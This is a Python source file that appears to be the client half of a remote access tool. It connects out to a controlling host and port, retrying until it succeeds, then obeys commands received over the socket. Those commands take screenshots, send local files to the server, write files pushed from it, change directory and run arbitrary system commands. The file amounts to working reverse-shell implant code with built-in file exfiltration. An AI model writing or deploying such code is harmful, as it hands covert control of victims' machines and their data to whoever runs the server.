import socket
import sys
import datetime  # use for the file naming
from .operations import Operations as Ope
import subprocess
import os
import time
from operations.utils.parser import parse_command


class Client:
    def __init__(self, host, port) -> None:
        self.host: str = host
        self.port: int = port
        self.server: socket.socket = self.create_sock()
        self.operations: Ope = Ope(self.server)

    @staticmethod
    def create_sock():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            return sock
        except:
            # print("Unable to create connection")
            sys.exit()

    def connect_to_host(self):
        while True:
            try:
                self.server.connect((self.host, self.port))
            except Exception as e:
                print("Error in connecting to the server: ", e)
                continue
            except KeyboardInterrupt:
                sys.exit()
                break

            if self.server:
                break

    def run_commands(self, data) -> bool:

        parsed: list[str] = parse_command(data)

        if not parsed:
            return 1

        # print("Parsed command: ", parsed)

        if parsed[0] == "cwd":
            self.operations.get_cwd()
            return 1

        if parsed[0] == "exit":
            self.operations.exit()
            return 0

        if parsed[0] == "hi":
            self.operations.hi()
            return 1

        if parsed[0] == "screenshot":
            self.operations.screenshot()
            return 1

        if parsed[0] == "download":
            filename = parsed[1]
            save_as = parsed[2]
            if os.path.exists(filename):
                self.operations.upload(filename)
                return 1
            else:
                self.server.sendall("File not found".encode())
                return 1

        if parsed[0] == "upload":
            filename = parsed[1]
            save_as = parsed[2]
            self.operations.download(save_as)
            return 1

        if parsed[0] == "cd":
            self.operations.change_dir(parsed[1])
            return 1

        if len(parsed) > 0:
            self.operations.system_commands(parsed)

        return 1

    def run_client(self):
        while True:

            data = self.server.recv(1024)
            data = data.decode("utf-8", "replace")

            # print("Command received: ", data)

            if not self.run_commands(data):
                return